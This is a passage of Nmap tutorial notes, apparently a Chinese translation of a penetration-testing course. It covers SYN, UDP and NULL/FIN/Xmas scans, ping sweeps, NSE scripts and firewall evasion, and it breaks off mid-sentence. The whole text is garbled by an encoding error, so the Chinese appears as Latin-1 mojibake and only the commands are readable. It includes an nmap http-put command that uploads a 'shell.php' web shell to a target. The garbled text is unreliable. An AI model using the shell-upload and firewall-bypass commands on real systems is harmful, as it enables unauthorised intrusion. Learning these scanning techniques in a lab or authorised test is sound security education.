æ‰«ææœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå³ï¼š å®ƒä»¬éœ€è¦ sudo æƒé™ [1] æ‰èƒ½åœ¨ Linux ä¸­æ­£å¸¸å·¥ä½œã€‚è¿™æ˜¯å› ä¸º SYN æ‰«æéœ€è¦èƒ½å¤Ÿåˆ›å»ºåŸå§‹æ•°æ®åŒ…ï¼ˆè€Œä¸æ˜¯å®Œæ•´çš„ TCP æ¡æ‰‹ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæœ‰ root ç”¨æˆ·æ‰æ‹¥æœ‰æ­¤æƒé™ã€‚ ä¸ç¨³å®šçš„æœåŠ¡æœ‰æ—¶ä¼šå›  SYN æ‰«æè€Œä¸­æ–­ï¼Œå¦‚æœå®¢æˆ·ç«¯æä¾›äº†ç”¨äºæµ‹è¯•çš„ç”Ÿäº§ç¯å¢ƒï¼Œè¿™å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œåˆ©å¤§äºå¼Šã€‚ å› æ­¤ï¼Œå¦‚æœä½¿ç”¨ sudo æƒé™è¿è¡Œï¼ŒSYN æ‰«ææ˜¯ Nmap ä½¿ç”¨çš„é»˜è®¤æ‰«æã€‚å¦‚æœåœ¨æ²¡æœ‰ sudo æƒé™çš„æƒ…å†µä¸‹è¿è¡Œï¼ŒNmap é»˜è®¤è¿›è¡Œæˆ‘ä»¬åœ¨ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­çœ‹åˆ°çš„ TCP è¿æ¥æ‰«æã€‚ å½“ä½¿ç”¨ SYN æ‰«ææ¥è¯†åˆ«å…³é—­å’Œè¿‡æ»¤çš„ç«¯å£æ—¶ï¼Œé€‚ç”¨ä¸ TCP è¿æ¥æ‰«æå®Œå…¨ç›¸åŒçš„è§„åˆ™ã€‚ å¦‚æœç«¯å£å…³é—­ï¼Œåˆ™æœåŠ¡å™¨ä¼šä½¿ç”¨ RST TCP æ•°æ®åŒ…è¿›è¡Œå“åº”ã€‚å¦‚æœç«¯å£è¢«é˜²ç«å¢™è¿‡æ»¤ï¼Œåˆ™ TCP SYN æ•°æ®åŒ…å°†è¢«ä¸¢å¼ƒï¼Œæˆ–è€…é€šè¿‡ TCP é‡ç½®è¿›è¡Œæ¬ºéª—ã€‚ åœ¨è¿™æ–¹é¢ï¼Œä¸¤æ¬¡æ‰«ææ˜¯ç›¸åŒçš„ï¼šæœ€å¤§çš„åŒºåˆ«åœ¨äºå®ƒä»¬å¤„ç†å¼€æ”¾ç«¯å£çš„æ–¹å¼ã€‚ [1] è¿˜å¯ä»¥é€šè¿‡ä¸º Nmap æä¾› CAP_NET_RAWã€CAP_NET_ADMIN å’Œ CAP_NET_BIND_SERVICE åŠŸèƒ½æ¥ä½¿ SYN æ‰«æå‘æŒ¥ä½œç”¨ï¼›ä½†æ˜¯ï¼Œè¿™å¯èƒ½æ— æ³•è®©è®¸å¤š NSE è„šæœ¬æ­£å¸¸è¿è¡Œã€‚ 0x06 UDP æ‰«æ ä¸ TCP ä¸åŒï¼ŒUDP è¿æ¥æ˜¯æ— çŠ¶æ€çš„ã€‚è¿™æ„å‘³ç€ï¼ŒUDP è¿æ¥ä¸æ˜¯é€šè¿‡æ¥å›â€œæ¡æ‰‹â€æ¥å¯åŠ¨è¿æ¥ï¼Œè€Œæ˜¯ä¾èµ–äºå°†æ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡ç«¯å£ï¼Œå¹¶æœ¬è´¨ä¸Šå¸Œæœ›å®ƒä»¬èƒ½å¤ŸæˆåŠŸã€‚è¿™ä½¿å¾— UDP éå¸¸é€‚åˆä¾èµ–é€Ÿåº¦è€Œä¸æ˜¯è´¨é‡çš„è¿æ¥ï¼ˆä¾‹å¦‚è§†é¢‘å…±äº«ï¼‰ï¼Œä½†ç¼ºä¹ç¡®è®¤ä½¿å¾— UDP æ‰«æå˜å¾—æ›´åŠ å›°éš¾ï¼ˆå¹¶ä¸”é€Ÿåº¦æ…¢å¾—å¤šï¼‰ã€‚ Nmap UDP æ‰«æçš„å¼€å…³æ˜¯ ( -sU ) å½“æ•°æ®åŒ…å‘é€åˆ°å¼€æ”¾çš„ UDP ç«¯å£æ—¶ï¼Œä¸åº”æœ‰å“åº”ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µæ—¶ï¼ŒNmap å°†ç«¯å£ç§°ä¸º open|filtered ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒæ€€ç–‘ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†å¯èƒ½è¢«é˜²ç«å¢™é˜»æ­¢ã€‚å¦‚æœå®ƒæ”¶åˆ° UDP å“åº”ï¼ˆè¿™æ˜¯éå¸¸ä¸å¯»å¸¸çš„ï¼‰ï¼Œåˆ™è¯¥ç«¯å£è¢«æ ‡è®°ä¸ºæ‰“å¼€ã€‚æ›´å¸¸è§çš„æ˜¯æ²¡æœ‰å“åº”ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šå†æ¬¡å‘é€è¯·æ±‚ä»¥è¿›è¡ŒåŒé‡æ£€æŸ¥ã€‚å¦‚æœä»ç„¶æ²¡æœ‰å“åº”ï¼Œåˆ™ç«¯å£è¢«æ ‡è®°ä¸ºæ‰“å¼€|å·²è¿‡æ»¤å¹¶ä¸” Nmap ç»§ç»­å‰è¿›ã€‚ å½“æ•°æ®åŒ…å‘é€åˆ°å…³é—­çš„ UDP ç«¯å£æ—¶ï¼Œç›®æ ‡åº”ä½¿ç”¨ ICMP (ping) æ•°æ®åŒ…è¿›è¡Œå“åº”ï¼Œå…¶ä¸­åŒ…å«è¯¥ç«¯å£æ— æ³•è®¿é—®çš„æ¶ˆæ¯ã€‚è¿™æ¸…æ¥šåœ°è¯†åˆ«äº†å…³é—­çš„ç«¯å£ï¼ŒNmap å°†å…¶æ ‡è®°ä¸ºå…³é—­çš„ç«¯å£å¹¶ç»§ç»­å‰è¿›ã€‚ ç”±äºéš¾ä»¥è¯†åˆ« UDP ç«¯å£æ˜¯å¦å®é™…æ‰“å¼€ï¼Œå› æ­¤ä¸å„ç§ TCP æ‰«æç›¸æ¯”ï¼ŒUDP æ‰«æå¾€å¾€éå¸¸æ…¢ï¼ˆåœ¨è¿æ¥è‰¯å¥½çš„æƒ…å†µä¸‹æ‰«æå‰ 1000 ä¸ªç«¯å£å¤§çº¦éœ€è¦ 20 åˆ†é’Ÿï¼‰ã€‚å› æ­¤ï¼Œåœ¨å¯ç”¨ --top-ports &lt;number&gt; çš„æƒ…å†µä¸‹è¿è¡Œ Nmap æ‰«æé€šå¸¸æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ nmap -sU --top-ports 20 &lt;target&gt; è¿›è¡Œæ‰«æã€‚å°†æ‰«æå‰ 20 ä¸ªæœ€å¸¸ç”¨çš„ UDP ç«¯å£ï¼Œä»è€Œè·å¾—æ›´å¯æ¥å—çš„æ‰«ææ—¶é—´ã€‚ å½“æ‰«æ UDP ç«¯å£æ—¶ï¼ŒNmap é€šå¸¸å‘é€å®Œå…¨ç©ºçš„è¯·æ±‚â€”â€”åªæ˜¯åŸå§‹çš„ UDP æ•°æ®åŒ…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºé€šå¸¸è¢«çŸ¥åæœåŠ¡å ç”¨çš„ç«¯å£ï¼Œå®ƒå°†å‘é€ç‰¹å®šäºåè®®çš„æœ‰æ•ˆè´Ÿè½½ï¼Œè¯¥æœ‰æ•ˆè´Ÿè½½æ›´æœ‰å¯èƒ½å¼•å‘å“åº”ï¼Œä»è€Œå¾—å‡ºæ›´å‡†ç¡®çš„ç»“æœã€‚ 0x07 NULLã€FINã€Xmasæ‰«æ NULLã€FIN å’Œ Xmas TCP ç«¯å£æ‰«ææ¯”æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡çš„å…¶ä»–ç«¯å£æ‰«æä¸å¤ªå¸¸ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä¸ä¼šåœ¨è¿™é‡Œæ·±å…¥è®¨è®ºã€‚è¿™ä¸‰è€…éƒ½æ˜¯ç›¸äº’å…³è”çš„ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨ï¼Œä¸»è¦æ˜¯å› ä¸ºç›¸å¯¹è€Œè¨€ï¼Œå®ƒä»¬æ¯” SYNâ€œéšå½¢â€æ‰«ææ›´åŠ éšè”½ã€‚ä» NULL æ‰«æå¼€å§‹ï¼š é¡¾åæ€ä¹‰ï¼ŒNULL æ‰«æ ( -sN ) æ˜¯æŒ‡å‘é€ TCP è¯·æ±‚æ—¶æ ¹æœ¬æ²¡æœ‰è®¾ç½®ä»»ä½•æ ‡å¿—ã€‚æ ¹æ® RFCï¼Œå¦‚æœç«¯å£å…³é—­ï¼Œç›®æ ‡ä¸»æœºåº”ä½¿ç”¨ RST è¿›è¡Œå“åº”ã€‚ FIN æ‰«æ ( -sF ) çš„å·¥ä½œæ–¹å¼å‡ ä¹ç›¸åŒï¼›ä½†æ˜¯ï¼Œä¸æ˜¯å‘é€å®Œå…¨ç©ºçš„æ•°æ®åŒ…ï¼Œè€Œæ˜¯å‘é€å¸¦æœ‰ FIN æ ‡å¿—çš„è¯·æ±‚ï¼ˆé€šå¸¸ç”¨äºæ­£å¸¸å…³é—­æ´»åŠ¨è¿æ¥ï¼‰ã€‚å¦‚æœç«¯å£å…³é—­ï¼ŒNmap å†æ¬¡æœŸæœ› RSTã€‚ ä¸æ­¤ç±»ä¸­çš„å…¶ä»–ä¸¤ä¸ªæ‰«æä¸€æ ·ï¼ŒXmas æ‰«æ ( -sX ) å‘é€æ ¼å¼é”™è¯¯çš„ TCP æ•°æ®åŒ…ï¼Œå¹¶æœŸæœ›å…³é—­ç«¯å£çš„ RST å“åº”ã€‚å®ƒè¢«ç§°ä¸ºåœ£è¯æ‰«æï¼Œå› ä¸ºå½“åœ¨ Wireshark ä¸­å°†å…¶è§†ä¸ºæ•°æ®åŒ…æ•è·æ—¶ï¼Œå®ƒè®¾ç½®çš„æ ‡å¿—ï¼ˆPSHã€URG å’Œ FINï¼‰ä½¿å…¶çœ‹èµ·æ¥åƒä¸€æ£µé—ªçƒçš„åœ£è¯æ ‘ã€‚ è¿™äº›æ‰«æå¯¹å¼€æ”¾ç«¯å£çš„é¢„æœŸå“åº”ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”ä¸ UDP æ‰«æçš„å“åº”éå¸¸ç›¸ä¼¼ã€‚å¦‚æœç«¯å£æ‰“å¼€ï¼Œåˆ™ä¸ä¼šå¯¹æ ¼å¼é”™è¯¯çš„æ•°æ®åŒ…åšå‡ºå“åº”ã€‚ä¸å¹¸çš„æ˜¯ï¼ˆä¸å¼€æ”¾çš„ UDP ç«¯å£ä¸€æ ·ï¼‰ï¼Œå¦‚æœç«¯å£å—é˜²ç«å¢™ä¿æŠ¤ï¼Œè¿™ä¹Ÿæ˜¯é¢„æœŸçš„è¡Œä¸ºï¼Œå› æ­¤ NULLã€FIN å’Œ Xmas æ‰«æå°†ä»…å°†ç«¯å£è¯†åˆ«ä¸ºå¼€æ”¾|è¿‡æ»¤ã€å…³é—­æˆ–è¿‡æ»¤ã€‚å¦‚æœæŸä¸ªç«¯å£è¢«è¿™äº›æ‰«æä¹‹ä¸€è¯†åˆ«ä¸ºå·²è¿‡æ»¤ï¼Œåˆ™é€šå¸¸æ˜¯å› ä¸ºç›®æ ‡å·²å“åº” ICMP æ— æ³•åˆ°è¾¾çš„æ•°æ®åŒ…ã€‚ è¿˜å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ RFC 793 è¦æ±‚ç½‘ç»œä¸»æœºå¯¹å…³é—­ç«¯å£ä½¿ç”¨ RST TCP æ•°æ®åŒ…å“åº”æ ¼å¼é”™è¯¯çš„æ•°æ®åŒ…ï¼Œè€Œå¯¹å¼€æ”¾ç«¯å£æ ¹æœ¬ä¸å“åº”ï¼›å®é™…æƒ…å†µå¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚ç‰¹åˆ«æ˜¯ï¼Œä¼—æ‰€å‘¨çŸ¥ï¼ŒMicrosoft Windowsï¼ˆä»¥åŠè®¸å¤š Cisco ç½‘ç»œè®¾å¤‡ï¼‰ä¼šä½¿ç”¨ RST å“åº”ä»»ä½•æ ¼å¼é”™è¯¯çš„ TCP æ•°æ®åŒ… - æ— è®ºç«¯å£æ˜¯å¦å®é™…æ‰“å¼€ã€‚è¿™ä¼šå¯¼è‡´æ‰€æœ‰ç«¯å£æ˜¾ç¤ºä¸ºå…³é—­ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œçš„ç›®æ ‡å½“ç„¶æ˜¯ç»•è¿‡é˜²ç«å¢™ã€‚è®¸å¤šé˜²ç«å¢™é…ç½®ä¸ºå°†ä¼ å…¥çš„ TCP æ•°æ®åŒ…ä¸¢å¼ƒåˆ°è®¾ç½®äº† SYN æ ‡å¿—çš„é˜»æ­¢ç«¯å£ï¼ˆä»è€Œé˜»æ­¢æ–°çš„è¿æ¥å‘èµ·è¯·æ±‚ï¼‰ã€‚é€šè¿‡å‘é€ä¸åŒ…å« SYN æ ‡å¿—çš„è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰æ•ˆåœ°ç»•è¿‡è¿™ç§é˜²ç«å¢™ã€‚è™½ç„¶è¿™åœ¨ç†è®ºä¸Šå¾ˆå¥½ï¼Œä½†å¤§å¤šæ•°ç°ä»£ IDS è§£å†³æ–¹æ¡ˆéƒ½ç†Ÿæ‚‰è¿™äº›æ‰«æç±»å‹ï¼Œå› æ­¤åœ¨å¤„ç†ç°ä»£ç³»ç»Ÿæ—¶ä¸è¦ä¾èµ–å®ƒä»¬ 100% æœ‰æ•ˆã€‚ 0x08 ICMP æ‰«æ åœ¨é»‘ç›’åˆ†é…ä¸­é¦–æ¬¡è¿æ¥åˆ°ç›®æ ‡ç½‘ç»œæ—¶ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç›®æ ‡æ˜¯è·å–ç½‘ç»œç»“æ„çš„â€œåœ°å›¾â€ï¼Œæˆ–è€…æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¸Œæœ›æŸ¥çœ‹å“ªäº› IP åœ°å€åŒ…å«æ´»åŠ¨ä¸»æœºï¼Œå“ªäº›ä¸åŒ…å«æ´»åŠ¨ä¸»æœºã€‚ å®ç°æ­¤ç›®çš„çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ Nmap æ‰§è¡Œæ‰€è°“çš„â€œping æ‰«æâ€ã€‚é¡¾åæ€ä¹‰ï¼ŒNmap å‘æŒ‡å®šç½‘ç»œçš„æ¯ä¸ªå¯èƒ½çš„ IP åœ°å€å‘é€ ICMP æ•°æ®åŒ…ã€‚å½“å®ƒæ”¶åˆ°å“åº”æ—¶ï¼Œå®ƒå°†å“åº”çš„ IP åœ°å€æ ‡è®°ä¸ºæ´»åŠ¨çš„ã€‚ç”±äºæˆ‘ä»¬å°†åœ¨åé¢çš„ä»»åŠ¡ä¸­çœ‹åˆ°çš„åŸå› ï¼Œè¿™å¹¶ä¸æ€»æ˜¯å‡†ç¡®çš„ï¼›ç„¶è€Œï¼Œå®ƒå¯ä»¥æä¾›ä¸€äº›åŸºçº¿ï¼Œå› æ­¤å€¼å¾—è®¨è®ºã€‚ ä¸ºäº†æ‰§è¡Œ ping æ‰«æï¼Œæˆ‘ä»¬å°† -sn å¼€å…³ä¸ IP èŒƒå›´ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨è¿å­—ç¬¦ ( - ) æˆ– CIDR è¡¨ç¤ºæ³•æŒ‡å®š IP èŒƒå›´ã€‚å³æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰«æ 192.168.0.x ç½‘ç»œï¼š nmap -sn 192.168.0.1-254or nmap -sn 192.168.0.0/24 -sn å¼€å…³å‘Šè¯‰ Nmap ä¸è¦æ‰«æä»»ä½•ç«¯å£â€”â€”å¼ºåˆ¶å®ƒä¸»è¦ä¾é  ICMP å›æ˜¾æ•°æ®åŒ…ï¼ˆæˆ–æœ¬åœ°ç½‘ç»œä¸Šçš„ ARP è¯·æ±‚ï¼Œå¦‚æœä½¿ç”¨ sudo è¿è¡Œæˆ–ç›´æ¥ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰æ¥è¯†åˆ«ç›®æ ‡ã€‚é™¤äº† ICMP å›æ˜¾è¯·æ±‚ä¹‹å¤–ï¼Œ -sn å¼€å…³è¿˜ä¼šå¯¼è‡´ nmap å‘ç›®æ ‡çš„ç«¯å£ 443 å‘é€ TCP SYN æ•°æ®åŒ…ä»¥åŠ TCP ACKï¼ˆå¦‚æœä¸ä»¥ root èº«ä»½è¿è¡Œï¼Œåˆ™å‘é€ TCP SYNï¼‰æ•°æ®åŒ…å‘é€è‡³ç›®æ ‡çš„ 80 ç«¯å£ã€‚ è¿™é‡Œå›¾ä¸Šå»æ‰+ç¬¦å· 0x09 NSE è„šæœ¬æ¦‚è¿° Nmap è„šæœ¬å¼•æ“ (NSE) æ˜¯ Nmap çš„ä¸€ä¸ªéå¸¸å¼ºå¤§çš„è¡¥å……ï¼Œç›¸å½“å¤§åœ°æ‰©å±•äº†å®ƒçš„åŠŸèƒ½ã€‚ NSE è„šæœ¬æ˜¯ç”¨ Lua ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ï¼Œå¯ç”¨äºæ‰§è¡Œå¤šç§æ“ä½œï¼šä»æ‰«ææ¼æ´åˆ°è‡ªåŠ¨åˆ©ç”¨æ¼æ´ã€‚ NSE å¯¹äºä¾¦å¯Ÿç‰¹åˆ«æœ‰ç”¨ï¼Œä½†æ˜¯ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è„šæœ¬åº“çš„èŒƒå›´æœ‰å¤šå¤§ã€‚ æœ‰å¾ˆå¤šç±»åˆ«å¯ä¾›é€‰æ‹©ã€‚ä¸€äº›æœ‰ç”¨çš„ç±»åˆ«åŒ…æ‹¬ï¼š safe :- ä¸ä¼šå½±å“ç›®æ ‡ intrusive ï¼š- ä¸å®‰å…¨ï¼šå¯èƒ½å½±å“ç›®æ ‡ vuln ï¼š- æ‰«ææ¼æ´ exploit ï¼š- å°è¯•åˆ©ç”¨æ¼æ´ auth ï¼š- å°è¯•ç»•è¿‡æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„èº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚åŒ¿åç™»å½• FTP æœåŠ¡å™¨ï¼‰ brute ï¼š- å°è¯•æš´åŠ›ç ´è§£æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„å‡­æ® discovery ï¼š- å°è¯•æŸ¥è¯¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡ä»¥è·å–æœ‰å…³ç½‘ç»œçš„æ›´å¤šä¿¡æ¯ï¼ˆä¾‹å¦‚æŸ¥è¯¢ SNMP æœåŠ¡å™¨ï¼‰ã€‚ å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æ›´è¯¦å°½çš„åˆ—è¡¨ï¼šhere åœ¨ä¸‹ä¸€ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£å¦‚ä½•ä¸ NSE äº¤äº’å¹¶ä½¿ç”¨è¿™äº›ç±»åˆ«ä¸­çš„è„šæœ¬ã€‚ 0x10 ä½¿ç”¨ NSE è„šæœ¬ åœ¨ä»»åŠ¡ 3 ä¸­ï¼Œæˆ‘ä»¬éå¸¸ç®€è¦åœ°äº†è§£äº†ä½¿ç”¨ --script=vuln ä» vuln ç±»åˆ«æ¿€æ´» NSE è„šæœ¬çš„ --script å¼€å…³ã€‚å…¶ä»–ç±»åˆ«çš„å·¥ä½œæ–¹å¼å®Œå…¨ç›¸åŒä¹Ÿå°±ä¸è¶³ä¸ºå¥‡äº†ã€‚å¦‚æœè¿è¡Œå‘½ä»¤ --script=safe ï¼Œåˆ™å°†é’ˆå¯¹ç›®æ ‡è¿è¡Œä»»ä½•é€‚ç”¨çš„å®‰å…¨è„šæœ¬ï¼ˆæ³¨æ„ï¼šä»…æ¿€æ´»é’ˆå¯¹æ´»åŠ¨æœåŠ¡çš„è„šæœ¬ï¼‰ã€‚ è¦è¿è¡Œç‰¹å®šè„šæœ¬ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ --script=&lt;script-name&gt; ï¼Œä¾‹å¦‚ --script=http-fileupload-exploiter ã€‚ é€šè¿‡ç”¨é€—å·åˆ†éš”å¤šä¸ªè„šæœ¬å¯ä»¥ä»¥è¿™ç§æ–¹å¼åŒæ—¶è¿è¡Œã€‚ä¾‹å¦‚ï¼š --script=smb-enum-users,smb-enum-shares ã€‚ æŸäº›è„šæœ¬éœ€è¦å‚æ•°ï¼ˆä¾‹å¦‚ï¼Œå‡­æ®ï¼Œå¦‚æœå®ƒä»¬æ­£åœ¨åˆ©ç”¨ç»è¿‡èº«ä»½éªŒè¯çš„æ¼æ´ï¼‰ã€‚è¿™äº›å¯ä»¥é€šè¿‡ --script-args Nmap å¼€å…³ç»™å‡ºã€‚ä¸€ä¸ªä¾‹å­æ˜¯ http-put è„šæœ¬ï¼ˆç”¨äºä½¿ç”¨ PUT æ–¹æ³•ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚è¿™éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼šå°†æ–‡ä»¶ä¸Šä¼ åˆ°çš„ URL ä»¥åŠæ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„ä½ç½®ã€‚ä¾‹å¦‚ï¼š nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php' è¯·æ³¨æ„ï¼Œå‚æ•°ä»¥é€—å·åˆ†éš”ï¼Œå¹¶ç”¨å¥ç‚¹è¿æ¥åˆ°ç›¸åº”çš„è„šæœ¬ï¼ˆå³ &lt;script-name&gt;.&lt;argument&gt; ï¼‰ã€‚ å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°è„šæœ¬åŠå…¶ç›¸åº”å‚æ•°ï¼ˆä»¥åŠç¤ºä¾‹ç”¨ä¾‹ï¼‰çš„å®Œæ•´åˆ—è¡¨ï¼šhere Nmap è„šæœ¬å¸¦æœ‰å†…ç½®å¸®åŠ©èœå•ï¼Œå¯ä»¥ä½¿ç”¨ nmap --script-help &lt;script-name&gt; è®¿é—®ã€‚è¿™å¾€å¾€ä¸åƒä¸Šé¢ç»™å‡ºçš„é“¾æ¥é‚£ä¹ˆå¹¿æ³›ï¼Œä½†æ˜¯ï¼Œåœ¨æœ¬åœ°å·¥ä½œæ—¶å®ƒä»ç„¶å¾ˆæœ‰ç”¨ã€‚ 0x11 NSE æœç´¢è„šæœ¬ å¥½çš„ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¦‚ä½•ä½¿ç”¨ Nmap ä¸­çš„è„šæœ¬ï¼Œä½†æˆ‘ä»¬è¿˜ä¸çŸ¥é“å¦‚ä½•æ‰¾åˆ°è¿™äº›è„šæœ¬ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ï¼Œæœ€å¥½å°†å®ƒä»¬ç»“åˆä½¿ç”¨ã€‚ç¬¬ä¸€ä¸ªæ˜¯ Nmap ç½‘ç«™ä¸Šçš„é¡µé¢ï¼ˆåœ¨ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­æåˆ°ï¼‰ï¼Œå…¶ä¸­åŒ…å«æ‰€æœ‰å®˜æ–¹è„šæœ¬çš„åˆ—è¡¨ã€‚ç¬¬äºŒä¸ªæ˜¯æ”»å‡»æœºå™¨ä¸Šçš„æœ¬åœ°å­˜å‚¨ã€‚ Nmap å°†å…¶è„šæœ¬å­˜å‚¨åœ¨ Linux ä¸Šçš„ /usr/share/nmap/scripts å¤„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ NSE è„šæœ¬éƒ½å­˜å‚¨åœ¨è¯¥ç›®å½•ä¸­â€”â€”å½“æ‚¨æŒ‡å®šè„šæœ¬æ—¶ï¼ŒNmap ä¼šåœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾è„šæœ¬ã€‚ æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æœç´¢å·²å®‰è£…çš„è„šæœ¬ã€‚ä¸€ç§æ˜¯ä½¿ç”¨ /usr/share/nmap/scripts/script.db æ–‡ä»¶ã€‚å°½ç®¡æœ‰æ‰©å±•åï¼Œä½†è¿™å®é™…ä¸Šå¹¶ä¸æ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œè€Œæ˜¯ä¸€ä¸ªåŒ…å«æ¯ä¸ªå¯ç”¨è„šæœ¬çš„æ–‡ä»¶åå’Œç±»åˆ«çš„æ ¼å¼åŒ–æ–‡æœ¬æ–‡ä»¶ã€‚ Nmap ä½¿ç”¨æ­¤æ–‡ä»¶æ¥è·Ÿè¸ªï¼ˆå¹¶åˆ©ç”¨ï¼‰è„šæœ¬å¼•æ“çš„è„šæœ¬ï¼›ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ grep æ¥æŸ¥æ‰¾è„šæœ¬ã€‚ä¾‹å¦‚ï¼š grep \"ftp\" /usr/share/nmap/scripts/script.db ã€‚ æœç´¢è„šæœ¬çš„ç¬¬äºŒç§æ–¹æ³•éå¸¸ç®€å•ï¼Œä½¿ç”¨ ls å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ls -l /usr/share/nmap/scripts/*ftp* è·å¾—ä¸ä¸Šä¸€ä¸ªå±å¹•æˆªå›¾ç›¸åŒçš„ç»“æœï¼š è¯·æ³¨æ„æœç´¢è¯ä¸¤ä¾§ä½¿ç”¨æ˜Ÿå· ( * )ç›¸åŒçš„æŠ€æœ¯ä¹Ÿå¯ç”¨äºæœç´¢è„šæœ¬ç±»åˆ«ã€‚ä¾‹å¦‚ï¼š grep \"safe\" /usr/share/nmap/scripts/script.db æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ï¼ŒNmap ç½‘ç«™åŒ…å«ä¸€ç³»åˆ—è„šæœ¬ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæœ¬åœ° scripts ç›®å½•ä¸­ç¼ºå°‘å…¶ä¸­ä¸€ä¸ªè„šæœ¬ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿæ ‡å‡† sudo apt update &amp;&amp; sudo apt install nmap åº”è¯¥å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼›ä½†æ˜¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä» Nmap ( sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse https://svn.nmap.org/nmap/scripts/&lt;script-name&gt;.nse ) ä¸‹è½½è„šæœ¬æ¥æ‰‹åŠ¨å®‰è£…è„šæœ¬ã€‚ç„¶åå¿…é¡»è·Ÿéšç€ nmap --script-updatedb ï¼Œå®ƒæ›´æ–° script.db æ–‡ä»¶ä»¥åŒ…å«æ–°ä¸‹è½½çš„è„šæœ¬ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ‚¨è¦åˆ¶ä½œè‡ªå·±çš„ NSE è„šæœ¬å¹¶å°†å…¶æ·»åŠ åˆ° Nmap ä¸­ï¼Œåˆ™éœ€è¦ç›¸åŒçš„â€œupdatedbâ€å‘½ä»¤â€”â€”è¿™æ˜¯ä¸€é¡¹éå¸¸æ˜“äºç®¡ç†çš„ä»»åŠ¡ï¼Œåªéœ€å…·å¤‡ä¸€äº› Lua åŸºç¡€çŸ¥è¯†å³å¯ï¼ ç¬¬äºŒé—®é¢˜é—®çš„æ˜¯ä¾èµ–ï¼š 0x12 é˜²ç«å¢™è§„é¿ æˆ‘ä»¬å·²ç»çœ‹åˆ°äº†ä¸€äº›ç»•è¿‡é˜²ç«å¢™çš„æŠ€æœ¯ï¼ˆæƒ³æƒ³éšå½¢æ‰«æï¼Œä»¥åŠ NULLã€FIN å’Œ Xmas æ‰«æï¼‰ï¼›ç„¶è€Œï¼Œè¿˜æœ‰å¦ä¸€ç§éå¸¸å¸¸è§çš„é˜²ç«å¢™é…ç½®ï¼Œæˆ‘ä»¬å¿…é¡»çŸ¥é“å¦‚ä½•ç»•è¿‡å®ƒã€‚ æ‚¨çš„å…¸å‹ Windows ä¸»æœºå°†ä½¿ç”¨å…¶é»˜è®¤é˜²ç«å¢™é˜»æ­¢æ‰€æœ‰ ICMP æ•°æ®åŒ…ã€‚è¿™å°±å¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬ä¸ä»…ç»å¸¸ä½¿ç”¨ ping æ¥æ‰‹åŠ¨å»ºç«‹ç›®æ ‡çš„æ´»åŠ¨ï¼ŒNmap é»˜è®¤æƒ…å†µä¸‹ä¹Ÿä¼šåšåŒæ ·çš„äº‹æƒ…ã€‚è¿™æ„å‘³ç€ Nmap ä¼šå°†å…·æœ‰æ­¤é˜²ç«å¢™é…ç½®çš„ä¸»æœºæ³¨å†Œä¸ºæ­»äº¡ä¸»æœºï¼Œå¹¶ä¸”æ ¹æœ¬ä¸æ‰«æå®ƒã€‚ å› 